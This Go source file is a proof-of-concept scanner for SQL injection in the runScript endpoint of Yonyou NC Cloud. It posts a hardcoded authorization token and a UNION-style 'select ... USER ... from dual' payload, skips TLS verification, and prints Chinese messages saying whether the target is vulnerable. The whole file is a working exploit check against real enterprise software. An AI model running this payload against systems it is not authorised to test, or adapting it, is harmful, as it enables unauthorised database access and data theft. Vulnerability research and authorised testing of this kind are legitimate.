package poc

import (
	"bytes"
	"crypto/tls"
	"io"
	"log"
	"net/http"
	"regexp"
	"strings"
)

func NCCloudrunScriptSQLi(target string) {
	url := strings.TrimRight(target, "/")
	data := "key=1&script=select 1,111*111,USER,4,5,6,7,8,9,10 from dual"
	uri := "/ncchr/attendScript/internal/runScript"
	req, err := http.NewRequest("POST", url+uri, bytes.NewBufferString(data))
	req.Header.Set("Content-Type", `application/x-www-form-urlencoded`)
	req.Header.Set("Authorization", `58e00466213416018d01d15de83b0198`)
	if err != nil {
		log.Println(err)
	}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		log.Println(err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Println(err)
	}
	tag := regexp.MustCompile("111\":12321").MatchString(string(body))
	if resp.StatusCode == http.StatusOK && tag {
		log.Println("[+] 存在NC Cloud runScript 接口SQL注入")
		log.Println("[+] 漏洞详情：https://github.com/wy876/POC/blob/9d8d73d175766896725bfa7bc58d0f2a88592b34/%E7%94%A8%E5%8F%8BNCCloud%E7%B3%BB%E7%BB%9FrunScript%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md")
	} else {
		log.Println("[-] 不存在NC Cloud runScript 接口SQL注入")
	}
}
